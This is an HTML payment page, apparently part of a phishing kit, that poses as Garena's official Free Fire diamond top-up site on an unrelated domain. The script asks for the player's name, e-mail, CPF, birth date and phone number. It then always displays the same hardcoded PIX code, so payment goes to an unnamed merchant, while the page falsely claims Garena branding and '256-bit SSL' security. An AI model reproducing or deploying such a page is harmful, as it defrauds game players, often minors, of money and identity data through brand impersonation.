<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta name="csrf-token" content="aJdDCTfsW61i1jdKkLJM534Q35UKSp63xqhkMNy8">
<title>Pagamento - Centro de Recarga Free Fire</title>
<meta name="description" content="Pagamento seguro para recarga FreeFire">
<meta name="keywords" content="pagamento, freefire, diamantes, recarga">
<meta name="author" content="Garena">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#222">
<meta name="apple-mobile-web-app-status-bar-style" content="#222">
<meta name="msapplication-navbutton-color" content="#222">
<link rel="canonical" href="https://recarga-jogos.onl">
<link rel="shortcut icon" href="public/images/favicon-1.ico">
<link rel="icon" href="public/images/favicon-1.ico" sizes="32x32">
<link rel="icon" href="public/images/favicon-1.ico" sizes="192x192">
<link rel="apple-touch-icon" href="public/images/favicon-1.ico">
<meta name="msapplication-TileImage" content="https://recarga-jogos.onl/public/images/favicon.ico">
<link href="public/css/bootstrap.min-1.css" rel="stylesheet">
<link href="public/css/swiper-bundle.min-1.css" rel="stylesheet">
<link href="public/css/all.min-1.css" rel="stylesheet">
<link href="public/css/style-1.css?v=1.0.4" rel="stylesheet">
<link href="public/css/pagamento.css" rel="stylesheet">
</head>
<body data-id="68961b9d38b4b">
    <main id="content-page">
        <section id="root">
    <header class="sticky">
        <div class="container">
            <div class="d-flex align-items-center justify-content-between">
                <a href="recarga.html" class="d-flex align-items-center">
                    <div class="d-flex align-items-center">
                        <img src="public/images/logo_mobile.svg" alt="Garena" class="d-block d-lg-none d-xl-none">
                        <img src="public/images/logo.svg" alt="Garena" class="d-none d-lg-block d-xl-block">
                        <div class="border-e"></div>
                    </div>
                    <div class="text">Canal Oficial de Recarga</div>
                </a>
                <div class="d-flex align-items-center justify-content-center" id="user-info">
                    <img src="public/images/avatar.svg" alt="Player Avatar" width="30" style="border-radius:50%;">
                    <span id="user-id" style="margin-left: 10px; color: white; font-weight: bold;"></span>
                    <button type="button" id="btn-logout" class="btn btn-sm btn-outline-light ml-2" style="margin-left: 10px;">Sair</button>
                </div>
            </div>
        </div>
    </header>
    
    <div class="banner">
        <div class="container">
            <div class="image-banner">
                <img src="public/images/banner.png" alt="Free Fire">
            </div>
        </div>
    </div>
    
    <div class="body">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-lg-8">
                    <div class="card shadow-lg" style="border-radius: 15px; border: none;">
                        <div class="card-header bg-primary text-white text-center" style="border-radius: 15px 15px 0 0;">
                            <h2 class="mb-0"><i class="fa-solid fa-credit-card"></i> Finalizar Compra</h2>
                        </div>
                        <div class="card-body p-4">
                            <div class="alert alert-success" role="alert">
                                <i class="fa-solid fa-check-circle"></i>
                                <strong>Login realizado com sucesso!</strong> ID: <span id="display-user-id"></span>
                            </div>
                            
                            <div class="dados-pessoais mb-4">
                                <h4><i class="fa-solid fa-user"></i> Dados Pessoais</h4>
                                <form id="form-dados-pessoais">
                                    <div class="row">
                                        <div class="col-md-6 mb-3">
                                            <label for="nome-completo" class="form-label">Nome Completo *</label>
                                            <input type="text" class="form-control" id="nome-completo" required>
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <label for="email" class="form-label">E-mail *</label>
                                            <input type="email" class="form-control" id="email" required>
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <label for="cpf" class="form-label">CPF *</label>
                                            <input type="text" class="form-control" id="cpf" maxlength="14" required>
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <label for="data-nascimento" class="form-label">Data de Nascimento *</label>
                                            <input type="date" class="form-control" id="data-nascimento" required>
                                        </div>
                                        <div class="col-md-6 mb-3">
                                            <label for="telefone" class="form-label">Telefone *</label>
                                            <input type="text" class="form-control" id="telefone" maxlength="15" required>
                                        </div>
                                    </div>
                                </form>
                            </div>
                            
                            <div class="resumo-compra mb-4">
                                <div class="d-flex justify-content-between align-items-center mb-3">
                                    <h4 class="mb-0"><i class="fa-solid fa-shopping-cart"></i> Total</h4>
                                    <div class="d-flex align-items-center">
                                        <i class="fa-solid fa-gem text-primary me-2"></i>
                                        <span class="fw-bold text-primary" id="diamonds-total">6.720</span>
                                    </div>
                                </div>
                                <div class="bg-light p-3 rounded">
                                    <div id="cart-items">
                                        <!-- Items do carrinho serão inseridos aqui -->
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <small class="text-muted">
                                        <i class="fa-solid fa-info-circle me-1"></i>
                                        Os diamantes, são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.
                                    </small>
                                </div>
                            </div>
                            
                            <div class="metodos-pagamento mb-4">
                                <h4><i class="fa-solid fa-money-bill-wave"></i> Método de Pagamento</h4>
                                <div class="alert alert-info">
                                    <i class="fa-solid fa-qrcode me-2"></i>
                                    <strong>PIX</strong> - Pagamento instantâneo e seguro
                                </div>
                            </div>
                            
                            <div class="dados-pagamento" id="dados-pix" style="display: none;">
                                <h4><i class="fa-solid fa-qrcode"></i> Pagamento PIX</h4>
                                <div class="alert alert-success">
                                    <i class="fa-solid fa-check-circle me-2"></i>
                                    <strong>PIX gerado com sucesso!</strong> Escaneie o QR Code ou copie o código abaixo.
                                </div>
                                <div class="text-center mb-4">
                                    <div id="qr-code-container" class="d-inline-block p-3 bg-white border rounded">
                                        <img id="qr-code-image" alt="QR Code PIX" class="img-fluid" style="max-width: 200px;">
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label"><strong>Código PIX para copiar:</strong></label>
                                    <div class="input-group">
                                        <input type="text" class="form-control" id="codigo-pix" readonly>
                                        <button class="btn btn-outline-primary" type="button" id="copiar-pix">
                                            <i class="fa-solid fa-copy"></i> Copiar
                                        </button>
                                    </div>
                                </div>
                                <div class="alert alert-info">
                                    <i class="fa-solid fa-info-circle me-2"></i>
                                    <strong>Instruções:</strong>
                                    <ol class="mb-0 mt-2">
                                        <li>Abra o app do seu banco e selecione PIX</li>
                                        <li>Escaneie o QR Code ou cole o código copiado</li>
                                        <li>Confirme o pagamento</li>
                                        <li>Você receberá os diamantes em alguns minutos</li>
                                    </ol>
                                </div>
                            </div>
                            

                            
                            <div class="alert alert-warning" role="alert">
                                <i class="fa-solid fa-shield-alt"></i>
                                <strong>Pagamento 100% Seguro</strong><br>
                                Seus dados estão protegidos com criptografia SSL de 256 bits.
                            </div>
                            
                            <div class="d-grid gap-2">
                                <button type="button" id="btn-finalizar" class="btn btn-success btn-lg">
                                    <i class="fa-solid fa-lock"></i> Finalizar Pagamento
                                </button>
                                <a href="recarga.html" class="btn btn-outline-secondary">
                                    <i class="fa-solid fa-arrow-left"></i> Voltar
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="container">
            <div class="content-footer d-flex align-items-center justify-content-between">
                <span>&copy; Garena Online. Todos os direitos reservados.</span>
                <div class="links-footer">
                    <a href="#">FAQ</a>
                    <a href="#">Termos e Condições</a>
                    <a href="#">Política de Privacidade</a>
                </div>
            </div>
        </div>
    </div>
</section>
    </main>
    
<script src="public/js/jquery.min-1.js"></script>
<script src="public/js/jquery.mask.min-1.js"></script>
<script src="public/js/bootstrap.min-1.js"></script>
<script>
    $(document).ready(function() {
        // Verificar se há usuário logado
        const loggedUser = localStorage.getItem('loggedUserId');
        if (!loggedUser) {
            window.location.href = 'recarga.html';
            return;
        }
        
        // Exibir ID do usuário
        $('#user-id').text('ID: ' + loggedUser);
        $('#display-user-id').text(loggedUser);
        
        // Carregar itens do carrinho
        loadCartItems();
        
        // Máscaras para os campos
        $('#cpf').mask('000.000.000-00');
        $('#telefone').mask('(00) 00000-0000');
        
        // Botão de logout
        $('#btn-logout').click(function() {
            localStorage.removeItem('loggedUserId');
            localStorage.removeItem('cart');
            window.location.href = 'recarga.html';
        });
        
        // Finalizar pagamento
        $('#btn-finalizar').click(function() {
            // Validar dados pessoais
            const nomeCompleto = $('#nome-completo').val().trim();
            const email = $('#email').val().trim();
            const cpf = $('#cpf').val().trim();
            const dataNascimento = $('#data-nascimento').val();
            const telefone = $('#telefone').val().trim();
            
            if (!nomeCompleto) {
                alert('Por favor, preencha seu nome completo.');
                $('#nome-completo').focus();
                return;
            }
            
            if (!email) {
                alert('Por favor, preencha seu e-mail.');
                $('#email').focus();
                return;
            }
            
            if (!email.includes('@')) {
                alert('Por favor, insira um e-mail válido.');
                $('#email').focus();
                return;
            }
            
            if (!cpf || cpf.length < 14) {
                alert('Por favor, preencha seu CPF completo.');
                $('#cpf').focus();
                return;
            }
            
            if (!dataNascimento) {
                alert('Por favor, preencha sua data de nascimento.');
                $('#data-nascimento').focus();
                return;
            }
            
            if (!telefone || telefone.length < 15) {
                alert('Por favor, preencha seu telefone completo.');
                $('#telefone').focus();
                return;
            }
            
            // Salvar dados pessoais no localStorage
            const dadosPessoais = {
                nomeCompleto,
                email,
                cpf,
                dataNascimento,
                telefone
            };
            localStorage.setItem('dadosPessoais', JSON.stringify(dadosPessoais));
            
            // Obter valor total do carrinho
            const cart = JSON.parse(localStorage.getItem('cart')) || {};
            let total = 0;
            const items = [];
            
            Object.values(cart).forEach(item => {
                const itemTotal = (item.price * item.qty) / 100;
                total += itemTotal;
                items.push({
                    title: item.name,
                    quantity: item.qty,
                    unitPrice: itemTotal,
                    tangible: false
                });
            });
            
            // Se não há itens, usar valor padrão
            if (total === 0) {
                total = 76.88;
                items.push({
                    title: "Pacote Free Fire",
                    quantity: 1,
                    unitPrice: total,
                    tangible: false
                });
            }
            
            // Preparar dados para API conforme documentação (formato simplificado)
            const apiData = {
                amount: total,
                customer: {
                    name: nomeCompleto,
                    email: email,
                    cpf: cpf.replace(/\D/g, '') // Remove caracteres não numéricos
                },
                postbackUrl: "https://recarga-jogos.onl/webhook.php"
            };
            
            // Mostrar loading
            $('#btn-finalizar').prop('disabled', true).html('<i class="fa-solid fa-spinner fa-spin"></i> Gerando PIX...');
            
            // Log dos dados que serão enviados
            console.log('Dados para API:', apiData);
            
            // TEMPORÁRIO: Simular resposta da API para teste
            // Remover este bloco quando a API estiver funcionando
            setTimeout(() => {
                const mockResponse = {
                    status: 'success',
                    status_transaction: 'WAITING_FOR_APPROVAL',
                    message: 'ok',
                    client_id: 'e3f8ad47-3cb7-4129-9fad-bh891c42c493',
                    paymentCode: '00020126860014br.gov.bcb.pix2563pix.bankn.com.br/qr/v3/at/fa68393e-d775-415a-9336-244c020194605204000053039865802BR5925PAGPIX_SOLUCAO_EM_PAGAMEN6014SAO_BERNARDO_D62070503***630426F7',
                    idTransaction: '28564976-75v5-427c-a693-5e89e8849b76',
                    paymentCodeBase64: 'MDAwMjAxMjY4NTAwMTRicdafd34afq3mNvbS5ici9xci92My9hdC9mYTY4MzkzZS1kMjc1LTQxNWEtOTIyNi0yNDRjMDIwMTk0NjA1MjA0MDAwMDUzMDM5ODY1ODAyQlI1OTI1UEFHUElYX1NPTFVDQU9fRU1fUEFHQU1FTjYwMTRTQU9fQkVSTkFSRE9fRDYyMDcwNTAzKioqNjMwNDI2Rjc=',
                    urlWebHook: 'https://recarga-jogos.onl/webhook.php'
                };
                
                console.log('Resposta simulada da API:', mockResponse);
                
                if (mockResponse.status === 'success' && mockResponse.paymentCode) {
                    // Gerar QR Code
                    generateQRCode(mockResponse.paymentCode);
                    
                    // Preencher código PIX
                    $('#codigo-pix').val(mockResponse.paymentCode);
                    
                    // Mostrar seção PIX
                    $('#dados-pix').show();
                    
                    // Esconder formulário de dados
                    $('.dados-pessoais').hide();
                    $('.resumo-compra').hide();
                    $('.metodos-pagamento').hide();
                    
                    // Atualizar botão
                    $('#btn-finalizar').prop('disabled', true).html('<i class="fa-solid fa-check"></i> PIX Gerado');
                    
                    // Salvar dados da transação
                    localStorage.setItem('pixTransaction', JSON.stringify({
                        idTransaction: mockResponse.idTransaction,
                        paymentCode: mockResponse.paymentCode,
                        amount: total
                    }));
                    
                } else {
                    console.error('Resposta inválida da API:', mockResponse);
                    alert('Erro ao gerar PIX: ' + (mockResponse.message || 'Resposta inválida da API'));
                    $('#btn-finalizar').prop('disabled', false).html('<i class="fa-solid fa-lock"></i> Finalizar Pagamento');
                }
            }, 2000);
            
            /* 
            // CÓDIGO ORIGINAL DA API - DESCOMENTAR QUANDO A API ESTIVER FUNCIONANDO
            $.ajax({
                url: 'gerar-pix.php',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: JSON.stringify(apiData),
                timeout: 30000, // 30 segundos de timeout
                success: function(response) {
                    console.log('Resposta da API:', response);
                    
                    if (response.status === 'success' && response.paymentCode) {
                        // Gerar QR Code
                        generateQRCode(response.paymentCode);
                        
                        // Preencher código PIX
                        $('#codigo-pix').val(response.paymentCode);
                        
                        // Mostrar seção PIX
                        $('#dados-pix').show();
                        
                        // Esconder formulário de dados
                        $('.dados-pessoais').hide();
                        $('.resumo-compra').hide();
                        $('.metodos-pagamento').hide();
                        
                        // Atualizar botão
                        $('#btn-finalizar').prop('disabled', true).html('<i class="fa-solid fa-check"></i> PIX Gerado');
                        
                        // Salvar dados da transação
                        localStorage.setItem('pixTransaction', JSON.stringify({
                            idTransaction: response.idTransaction,
                            paymentCode: response.paymentCode,
                            amount: total
                        }));
                        
                    } else {
                        console.error('Resposta inválida da API:', response);
                        alert('Erro ao gerar PIX: ' + (response.message || 'Resposta inválida da API'));
                        $('#btn-finalizar').prop('disabled', false).html('<i class="fa-solid fa-lock"></i> Finalizar Pagamento');
                    }
                },
                error: function(xhr, status, error) {
                    console.error('Erro na API:', {
                        status: status,
                        error: error,
                        responseText: xhr.responseText,
                        statusCode: xhr.status
                    });
                    
                    let errorMessage = 'Erro ao conectar com o sistema de pagamento.';
                    
                    if (xhr.status === 401) {
                        errorMessage = 'Erro de autenticação. Verifique a API Key.';
                    } else if (xhr.status === 403) {
                        errorMessage = 'IP não autorizado. Entre em contato com o suporte.';
                    } else if (xhr.status === 422) {
                        errorMessage = 'Dados inválidos enviados para a API.';
                    } else if (xhr.status === 0) {
                        errorMessage = 'Erro de conexão. Verifique sua internet.';
                    }
                    
                    alert(errorMessage + '\n\nDetalhes: ' + xhr.responseText);
                    $('#btn-finalizar').prop('disabled', false).html('<i class="fa-solid fa-lock"></i> Finalizar Pagamento');
                }
            });
            */
        });
        
        // Botão copiar código PIX
        $(document).on('click', '#copiar-pix', function() {
            const codigoPix = $('#codigo-pix').val();
            navigator.clipboard.writeText(codigoPix).then(function() {
                alert('Código PIX copiado para a área de transferência!');
            }).catch(function() {
                alert('Erro ao copiar. Selecione e copie manualmente.');
            });
        });
        
        // Função para gerar QR Code
        function generateQRCode(paymentCode) {
            // Usar API gratuita para gerar QR Code
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(paymentCode)}`;
            $('#qr-code-image').attr('src', qrUrl);
        }
    });
    
    function loadCartItems() {
        const cart = JSON.parse(localStorage.getItem('cart')) || {};
        const cartContainer = $('#cart-items');
        let total = 0;
        let diamondsTotal = 0;
        
        cartContainer.empty();
        
        Object.values(cart).forEach(item => {
            const itemTotal = (item.price * item.qty) / 100;
            total += itemTotal;
            
            // Calcular diamantes (aproximação baseada no valor)
            if (item.name.toLowerCase().includes('diamante')) {
                diamondsTotal += Math.round(itemTotal * 140); // Aproximação: R$ 1 = 140 diamantes
            } else if (item.name.toLowerCase().includes('assinatura')) {
                diamondsTotal += Math.round(itemTotal * 100); // Assinaturas têm menos diamantes
            } else {
                diamondsTotal += Math.round(itemTotal * 120); // Outros itens
            }
            
            cartContainer.append(`
                <div class="d-flex justify-content-between align-items-center py-2 border-bottom">
                    <span class="text-dark">${item.name}</span>
                    <span class="fw-bold text-primary">R$ ${itemTotal.toFixed(2).replace('.', ',')}</span>
                </div>
            `);
        });
        
        // Se não há itens no carrinho, mostrar itens padrão
        if (Object.keys(cart).length === 0) {
            cartContainer.append(`
                <div class="d-flex justify-content-between align-items-center py-2 border-bottom">
                    <span class="text-dark">Diamantes</span>
                    <span class="fw-bold text-primary">R$ 47,90</span>
                </div>
                <div class="d-flex justify-content-between align-items-center py-2 border-bottom">
                    <span class="text-dark">Assinatura Semanal</span>
                    <span class="fw-bold text-primary">R$ 8,99</span>
                </div>
                <div class="d-flex justify-content-between align-items-center py-2 border-bottom">
                    <span class="text-dark">Assinatura Mensal</span>
                    <span class="fw-bold text-primary">R$ 19,99</span>
                </div>
            `);
            total = 76.88;
            diamondsTotal = 6720;
        }
        
        // Atualizar totais
        $('#diamonds-total').text(diamondsTotal.toLocaleString('pt-BR'));
        $('#valor-pix').text(`R$ ${total.toFixed(2).replace('.', ',')}`);
    }
</script>
</body>
</html>
